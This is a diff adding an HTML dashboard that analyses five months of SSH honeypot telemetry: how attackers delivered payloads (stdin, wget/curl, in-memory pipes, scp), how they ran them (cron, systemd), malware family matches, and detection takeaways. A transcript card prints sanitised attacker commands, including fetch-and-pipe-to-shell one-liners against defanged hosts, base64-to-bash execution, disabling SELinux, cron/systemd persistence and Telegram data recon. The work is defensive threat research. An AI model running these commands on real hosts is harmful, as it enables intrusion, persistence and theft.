@@ -1,0 +1,568 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SSH Honeypot Payload Analysis</title>
+<style>
+:root {
+  --surface-1: #fcfcfb;
+  --surface-page: #f9f9f7;
+  --text-primary: #0b0b0b;
+  --text-secondary: #52514e;
+  --text-muted: #898781;
+  --gridline: #e1e0d9;
+  --baseline: #c3c2b7;
+  --border: rgba(11,11,11,0.10);
+  --series-1: #2a78d6;
+  --series-2: #eb6834;
+  --series-3: #1baf7a;
+  --series-4: #eda100;
+  --series-5: #e87ba4;
+  --series-6: #008300;
+  --series-muted: #c3c2b7;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --surface-1: #1a1a19;
+    --surface-page: #0d0d0d;
+    --text-primary: #ffffff;
+    --text-secondary: #c3c2b7;
+    --text-muted: #898781;
+    --gridline: #2c2c2a;
+    --baseline: #383835;
+    --border: rgba(255,255,255,0.10);
+    --series-1: #3987e5;
+    --series-2: #d95926;
+    --series-3: #199e70;
+    --series-4: #c98500;
+    --series-5: #d55181;
+    --series-6: #008300;
+    --series-muted: #898781;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --surface-1: #1a1a19;
+  --surface-page: #0d0d0d;
+  --text-primary: #ffffff;
+  --text-secondary: #c3c2b7;
+  --text-muted: #898781;
+  --gridline: #2c2c2a;
+  --baseline: #383835;
+  --border: rgba(255,255,255,0.10);
+  --series-1: #3987e5;
+  --series-2: #d95926;
+  --series-3: #199e70;
+  --series-4: #c98500;
+  --series-5: #d55181;
+  --series-6: #008300;
+  --series-muted: #898781;
+  color-scheme: dark;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
+  background: var(--surface-page);
+  color: var(--text-primary);
+  line-height: 1.5;
+  padding: 16px;
+  max-width: 900px;
+  margin: 0 auto;
+}
+h1 { font-size: 1.5rem; font-weight: 700; margin-bottom: 4px; }
+.subtitle { color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 24px; }
+.kpi-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 12px;
+  margin-bottom: 24px;
+}
+.stat-tile {
+  background: var(--surface-1);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+}
+.stat-label {
+  font-size: 0.75rem;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  margin-bottom: 4px;
+}
+.stat-value {
+  font-size: 1.75rem;
+  font-weight: 600;
+  line-height: 1.2;
+}
+.stat-detail {
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  margin-top: 4px;
+}
+.card {
+  background: var(--surface-1);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 20px;
+  margin-bottom: 16px;
+}
+.card-title {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+.card-subtitle {
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  margin-bottom: 16px;
+}
+/* horizontal bar chart */
+.hbar-chart { display: flex; flex-direction: column; gap: 10px; }
+.hbar-row { display: flex; align-items: center; gap: 8px; }
+.hbar-label {
+  width: 180px;
+  font-size: 0.8125rem;
+  color: var(--text-secondary);
+  text-align: right;
+  flex-shrink: 0;
+}
+.hbar-track {
+  flex: 1;
+  height: 20px;
+  position: relative;
+  background: transparent;
+}
+.hbar-fill {
+  height: 100%;
+  border-radius: 0 4px 4px 0;
+  min-width: 2px;
+  transition: width 0.3s ease;
+  position: relative;
+}
+.hbar-value {
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  white-space: nowrap;
+  min-width: 70px;
+  flex-shrink: 0;
+}
+/* legend */
+.legend {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  margin-bottom: 12px;
+}
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+}
+.legend-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 2px;
+  flex-shrink: 0;
+}
+/* stacked bar */
+.stacked-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+.stacked-label {
+  width: 100px;
+  font-size: 0.8125rem;
+  color: var(--text-secondary);
+  text-align: right;
+  flex-shrink: 0;
+}
+.stacked-track {
+  flex: 1;
+  height: 24px;
+  display: flex;
+  border-radius: 4px;
+  overflow: hidden;
+  position: relative;
+}
+.stacked-seg {
+  height: 100%;
+  position: relative;
+  /* 2px surface gap between segments */
+  border-right: 2px solid var(--surface-1);
+}
+.stacked-seg:last-child { border-right: none; }
+.stacked-total {
+  font-size: 0.75rem;
+  color: var(--text-secondary);
+  min-width: 50px;
+  flex-shrink: 0;
+}
+/* transcript card */
+.transcript-card {
+  background: var(--surface-page);
+  border: 1px solid var(--gridline);
+  border-radius: 6px;
+  padding: 12px 16px;
+  margin-bottom: 10px;
+}
+.transcript-header {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  align-items: center;
+  margin-bottom: 8px;
+}
+.transcript-tag {
+  font-size: 0.6875rem;
+  font-weight: 600;
+  padding: 2px 8px;
+  border-radius: 4px;
+  color: #fff;
+  text-transform: uppercase;
+  letter-spacing: 0.03em;
+}
+.transcript-meta {
+  font-size: 0.75rem;
+  color: var(--text-muted);
+}
+.transcript-body {
+  font-family: "SF Mono", "Cascadia Mono", "Fira Code", monospace;
+  font-size: 0.75rem;
+  line-height: 1.6;
+  color: var(--text-secondary);
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+/* tooltip */
+.tooltip-host { position: relative; cursor: default; }
+.tooltip-host .tip {
+  display: none;
+  position: absolute;
+  bottom: calc(100% + 6px);
+  left: 50%;
+  transform: translateX(-50%);
+  background: var(--text-primary);
+  color: var(--surface-1);
+  font-size: 0.6875rem;
+  padding: 4px 8px;
+  border-radius: 4px;
+  white-space: nowrap;
+  z-index: 10;
+  pointer-events: none;
+}
+.tooltip-host:hover .tip { display: block; }
+.section-note {
+  font-size: 0.8125rem;
+  color: var(--text-secondary);
+  margin-bottom: 16px;
+  line-height: 1.5;
+}
+</style>
+</head>
+<body>
+
+<h1>SSH Honeypot: Hands-on-Keyboard Payload Analysis</h1>
+<p class="subtitle">153 days of attacker telemetry &middot; 69,979 sessions with commands &middot; 6,613 distinct source IPs</p>
+
+<!-- KPI row -->
+<div class="kpi-row">
+  <div class="stat-tile">
+    <div class="stat-label">Sessions with commands</div>
+    <div class="stat-value">69,979</div>
+    <div class="stat-detail">49.6% of 141,186 total sessions</div>
+  </div>
+  <div class="stat-tile">
+    <div class="stat-label">Staged + executed</div>
+    <div class="stat-value">4,893</div>
+    <div class="stat-detail">4,703 file + 190 in-memory</div>
+  </div>
+  <div class="stat-tile">
+    <div class="stat-label">Distinct sources</div>
+    <div class="stat-value">619</div>
+    <div class="stat-detail">sources that staged then executed</div>
+  </div>
+  <div class="stat-tile">
+    <div class="stat-label">Median stage→run</div>
+    <div class="stat-value">15.6s</div>
+    <div class="stat-detail">p90: 18.4s &middot; max: 125.7s</div>
+  </div>
+</div>
+
+<!-- Chart 1: Session behavior breakdown -->
+<div class="card">
+  <div class="card-title">What were the sessions doing?</div>
+  <div class="card-subtitle">69,979 sessions with commands, classified by behavior</div>
+  <div class="hbar-chart">
+    <div class="hbar-row">
+      <div class="hbar-label">No staging / exec activity</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:90.91%;background:var(--series-muted)"><span class="tip">63,619 sessions (90.91%) &middot; 88 sources — brute force probes, password sprays, recon-only bots that never dropped anything</span></div></div>
+      <div class="hbar-value">63,619 &middot; 90.9%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Staged, then executed</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:calc(6.72% * 1.0);background:var(--series-1)"><span class="tip">4,703 sessions from 619 sources — payload written to disk, then run (directly or via cron)</span></div></div>
+      <div class="hbar-value">4,703 &middot; 6.7%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Execute-like, nothing new</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:calc(0.29% * 10);background:var(--series-muted);opacity:0.6"><span class="tip">204 sessions — interpreter one-liners, reverse shells, system binary calls</span></div></div>
+      <div class="hbar-value">204 &middot; 0.3%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">In-memory (no file)</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:calc(0.27% * 10);background:var(--series-2)"><span class="tip">190 sessions from 10 sources — payload piped into sh/bash, no file written</span></div></div>
+      <div class="hbar-value">190 &middot; 0.3%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Staged, never executed</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:calc(0.18% * 10);background:var(--series-4)"><span class="tip">124 sessions from 68 sources — file written but never ran in the session</span></div></div>
+      <div class="hbar-value">124 &middot; 0.2%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Executed, no staging seen</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:calc(0.004% * 1000);background:var(--series-5)"><span class="tip">3 sessions from 2 sources — stage + run split across different SSH connections</span></div></div>
+      <div class="hbar-value">3 &middot; &lt;0.01%</div>
+    </div>
+  </div>
+</div>
+
+<!-- Chart 2: Delivery methods -->
+<div class="card">
+  <div class="card-title">How did payloads land?</div>
+  <div class="card-subtitle">First-stage delivery method for 4,703 staged-then-executed sessions + 190 in-memory</div>
+  <div class="legend">
+    <div class="legend-item"><div class="legend-dot" style="background:var(--series-1)"></div> stdin to file (cat &gt; file)</div>
+    <div class="legend-item"><div class="legend-dot" style="background:var(--series-2)"></div> Download to file (wget/curl)</div>
+    <div class="legend-item"><div class="legend-dot" style="background:var(--series-3)"></div> In-memory (pipe to interpreter)</div>
+    <div class="legend-item"><div class="legend-dot" style="background:var(--series-4)"></div> scp pull</div>
+  </div>
+  <div class="hbar-chart">
+    <div class="hbar-row">
+      <div class="hbar-label">stdin to file</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:82.9%;background:var(--series-1)"><span class="tip">4,055 sessions — cat &gt; w.sh or cat &gt; astats, payload sent over the SSH channel itself. No download utility used. Biggest family: cron + systemd persistence.</span></div></div>
+      <div class="hbar-value">4,055 &middot; 82.9%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Download to file</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:9.5%;background:var(--series-2)"><span class="tip">463 sessions — wget -O bot, curl -o payload, or tftp get. Architecture-named binaries (bot.amd64, bot.mips, etc).</span></div></div>
+      <div class="hbar-value">463 &middot; 9.5%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">In-memory (pipe to sh)</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:3.9%;background:var(--series-3)"><span class="tip">190 sessions — wget -qO- | sh, curl | sh, base64 -d | bash. No file written to disk.</span></div></div>
+      <div class="hbar-value">190 &middot; 3.9%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">scp pull</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:3.8%;background:var(--series-4)"><span class="tip">185 sessions from 3 sources — wrote an embedded SSH key, pulled payload with scp, fell back to curl if scp failed.</span></div></div>
+      <div class="hbar-value">185 &middot; 3.8%</div>
+    </div>
+  </div>
+  <p class="section-note" style="margin-top:12px">The headline: 82.9% of payloads arrived over the SSH channel's own stdin. A detection keyed only on wget/curl/tftp would miss the majority.</p>
+</div>
+
+<!-- Chart 3: Execution method -->
+<div class="card">
+  <div class="card-title">How did payloads run?</div>
+  <div class="card-subtitle">Execution method for 4,703 staged-then-executed sessions</div>
+  <div class="hbar-chart">
+    <div class="hbar-row">
+      <div class="hbar-label">Cron / systemd (deferred)</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:86.2%;background:var(--series-1)"><span class="tip">4,055 sessions — payload scheduled via @reboot cron + systemd user unit. Never executed directly in the SSH session. On a real host, crond runs it later.</span></div></div>
+      <div class="hbar-value">4,055 &middot; 86.2%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Direct run in session</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:13.8%;background:var(--series-2)"><span class="tip">648 sessions — chmod +x; ./bot or sh out_sh. Stage-to-run median: 0.00s (immediate). Max: 14.8s.</span></div></div>
+      <div class="hbar-value">648 &middot; 13.8%</div>
+    </div>
+  </div>
+  <p class="section-note" style="margin-top:12px">86% of execution was deferred — cron would launch the payload outside the SSH session. A same-session process correlation misses most of these.</p>
+</div>
+
+<!-- Chart 4: Malware families observed (Variation matching) -->
+<div class="card">
+  <div class="card-title">Known malware families matched by command shape</div>
+  <div class="card-subtitle">Pattern matching against 5 known SSH attack families</div>
+  <div class="hbar-chart">
+    <div class="hbar-row">
+      <div class="hbar-label">XorDDoS-style curl dropper</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:100%;background:var(--series-1)"><span class="tip">381 sessions from 2 sources — SSH brute-force → recon → curl second stage. All 381 did recon first.</span></div></div>
+      <div class="hbar-value">381 &middot; 2 sources</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Fileless curl | sh</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:97.9%;background:var(--series-3)"><span class="tip">373 sessions from 10 sources — wget/curl piped to sh. 312 did recon first, 61 skipped it.</span></div></div>
+      <div class="hbar-value">373 &middot; 10 sources</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">Mirai-style busybox loader</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:7.1%;background:var(--series-2)"><span class="tip">27 sessions from 6 sources — busybox, tftp, arch-named binaries. 26 of 27 skipped recon entirely (counterexample to recon-then-fetch).</span></div></div>
+      <div class="hbar-value">27 &middot; 6 sources</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">sh -c "$(curl ...)" substitution</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:0.8%;background:var(--series-5)"><span class="tip">3 sessions from 1 source — command substitution variant, less common.</span></div></div>
+      <div class="hbar-value">3 &middot; 1 source</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label" style="color:var(--text-muted)">Outlaw-style miner/scanner</div>
+      <div class="hbar-track"><div class="hbar-fill" style="width:0;background:var(--series-muted)"></div></div>
+      <div class="hbar-value" style="color:var(--text-muted)">0 &middot; not observed</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label" style="color:var(--text-muted)">ShellBot (PerlBot) IRC</div>
+      <div class="hbar-track"><div class="hbar-fill" style="width:0;background:var(--series-muted)"></div></div>
+      <div class="hbar-value" style="color:var(--text-muted)">0 &middot; not observed</div>
+    </div>
+  </div>
+</div>
+
+<!-- Non-download delivery detail -->
+<div class="card">
+  <div class="card-title">Non-download delivery breakdown</div>
+  <div class="card-subtitle">4,174 sessions that staged payloads without wget/curl/tftp</div>
+  <div class="hbar-chart">
+    <div class="hbar-row">
+      <div class="hbar-label">stdin to file (cat &gt; w.sh)</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:98.6%;background:var(--series-1)"><span class="tip">4,117 sessions — largest family: writes w.sh from stdin, schedules it with cron @reboot + hourly, adds systemd user unit, kills competitors. Payload bytes NOT captured by sensor.</span></div></div>
+      <div class="hbar-value">4,117 &middot; 98.6%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">scp push (scp -t)</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:1.3%;background:var(--series-2)"><span class="tip">54 sessions — scp -t (receive side). Upload bytes not captured. Sensor didn't implement scp protocol, so upload likely failed.</span></div></div>
+      <div class="hbar-value">54 &middot; 1.3%</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">/dev/tcp reverse conn</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:0.05%;background:var(--series-3)"><span class="tip">2 sessions</span></div></div>
+      <div class="hbar-value">2</div>
+    </div>
+    <div class="hbar-row">
+      <div class="hbar-label">base64 decode</div>
+      <div class="hbar-track"><div class="hbar-fill tooltip-host" style="width:0.02%;background:var(--series-5)"><span class="tip">1 session — echo [blob] | base64 -d | bash</span></div></div>
+      <div class="hbar-value">1</div>
+    </div>
+  </div>
+</div>
+
+<!-- Example transcripts -->
+<div class="card">
+  <div class="card-title">Real attacker transcripts — the variety</div>
+  <div class="card-subtitle">Sanitised command transcripts from the honeypot (nothing ran — emulated shell)</div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-1)">stdin + cron persistence</span>
+      <span class="transcript-meta">src-039 &middot; 3,404 sessions with this shape</span>
+    </div>
+    <div class="transcript-body">+0.85s  uname -a
++1.93s  sh -c 'for d in /dev/shm /tmp /var/run /mnt /root /; do cd "$d" && break; done'
++2.80s  cat /proc/cpuinfo | grep processor | wc -l
++11.6s  cd /tmp && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
++27.5s  crontab — @reboot + hourly schedule for w.sh
++35.7s  systemd user unit: watcher-netai.service
++37.2s  ps -eo pid,pcpu,comm --sort=-pcpu | head -n 10
++41.2s  kill competitors, rm -rf, clean crontab
+        ... 51 more lines of competitor cleanup</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-2)">wget + direct run</span>
+      <span class="transcript-meta">src-3856 &middot; architecture-named binary</span>
+    </div>
+    <div class="transcript-body">+0.20s  uname -a
++18.5s  wget hxxp://src-3856:8080/bot.amd64 -O bot; chmod 777 bot; ./bot telnet.amd64; rm -f bot</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-4)">scp pull + embedded key</span>
+      <span class="transcript-meta">src-028 &middot; 185 sessions</span>
+    </div>
+    <div class="transcript-body">+0.79s  uname -a; echo auth_ok
+        cd /tmp; echo '&lt;private-key&gt;' > key.ppk; chmod 400 key.ppk
+        scp -i key.ppk dlr@staging:sh out_sh
+        if [ $? -eq 0 ]; then sh out_sh
+        else (curl -sk hxxps://staging/sh) | sh -s ssh; fi</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-3)">fileless curl | sh</span>
+      <span class="transcript-meta">src-028 &middot; 373 sessions with this pattern</span>
+    </div>
+    <div class="transcript-body">+0.46s  uname -a; (wget --no-check-certificate -qO- hxxps://dst/sh || curl -sk hxxps://dst/sh) | sh -s ssh</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-5)">base64 decode | bash</span>
+      <span class="transcript-meta">src-4113 &middot; single session</span>
+    </div>
+    <div class="transcript-body">+0.53s  echo &lt;long-base64-blob&gt; | base64 -d | bash</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-muted)">GPU miner recon</span>
+      <span class="transcript-meta">src-001 &middot; recon only, no payload</span>
+    </div>
+    <div class="transcript-body">+0.24s  /bin/./uname -s -v -n -r -m
++0.49s  uptime -p
++0.73s  lspci | grep VGA | cut -f5- -d ' '
++0.97s  lspci | grep VGA -c
++1.22s  nvidia-smi -q | grep "Product Name" | head -n 1
++1.46s  lspci | grep "3D controller" | cut -f5- -d ' '
++1.70s  nvidia-smi — counting GPUs</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-muted)">MikroTik/Telegram recon</span>
+      <span class="transcript-meta">src-045 &middot; hunting for routers + Telegram data</span>
+    </div>
+    <div class="transcript-body">+0.59s  /ip cloud print
++1.49s  ifconfig
++2.65s  uname -a
++3.79s  cat /proc/cpuinfo
++4.70s  ps | grep '[Mm]iner'
++7.92s  ls -la ~/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod*
++9.15s  locate D877F783D5D3EF8Cs
++10.8s  echo Hi | cat -n</div>
+  </div>
+
+  <div class="transcript-card">
+    <div class="transcript-header">
+      <span class="transcript-tag" style="background:var(--series-muted)">cross-session: stage then run</span>
+      <span class="transcript-meta">src-5063 &middot; split across 2 SSH connections</span>
+    </div>
+    <div class="transcript-body"><b>Connection 1 (20:27:04):</b>
++0.21s  perl /tmp/solid.pl >/dev/null 2>&1; rm -rf /tmp/solid*; uname -a
+
+<b>Connection 2 (20:30:18 — 3 min later):</b>
++16.5s  setenforce 0; cd /tmp; tar zxfv m.tgz; cd .bash; chmod +x *; MODE=run ./go
+        rm -rf /tmp/spirit /tmp/.bash/go /tmp/.bash/timeout</div>
+  </div>
+</div>
+
+<!-- Key takeaways -->
+<div class="card" style="border-left: 3px solid var(--series-1);">
+  <div class="card-title">Key takeaways</div>
+  <div class="section-note">
+    <strong>The variety is the point.</strong> These attackers used at least 6 distinct delivery mechanisms (stdin, wget, curl, scp, base64, /dev/tcp) and 3 execution paths (direct run, cron, systemd) — but every single one had to land code and run it. That's the chokepoint.<br><br>
+    <strong>Most payloads never touched a download utility.</strong> 82.9% of staged-then-executed sessions delivered payloads over the SSH channel's own stdin. A detection rule watching only for wget/curl/tftp catches less than 1 in 5.<br><br>
+    <strong>Recon was common but not required.</strong> 1,344 sessions did recon and stopped. 130 sessions fetched payloads with zero recon. 26 of 27 Mirai-style loaders skipped discovery entirely.<br><br>
+    <strong>Some operators split the attack across connections.</strong> src-5063 pushed a payload in one SSH session and ran it 3 minutes later in a new one — same source, different session IDs.
+  </div>
+</div>
+
+<p style="font-size:0.6875rem; color:var(--text-muted); text-align:center; margin-top:16px;">
+  Data: SSH honeypot (custom asyncssh, Solana validator lure) &middot; 2026-04-27 to 2026-09-26 UTC &middot; 153 days &middot; Operator sessions excluded
+</p>
+
+</body>
+</html>
